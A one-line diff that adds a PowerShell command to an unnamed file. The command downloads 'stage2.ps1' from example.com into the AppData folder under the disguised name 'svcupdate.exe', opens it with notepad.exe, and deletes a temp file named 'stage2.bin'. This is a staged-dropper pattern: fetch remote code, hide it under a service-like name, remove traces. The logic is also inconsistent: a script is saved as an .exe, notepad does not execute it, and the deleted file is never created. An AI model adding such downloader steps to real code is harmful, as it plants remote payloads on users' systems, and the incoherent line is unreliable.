@@ -1,0 +1,1 @@
+$FetchUrl = 'https://example.com:443/stage2.ps1'; $PayloadPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $FetchUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
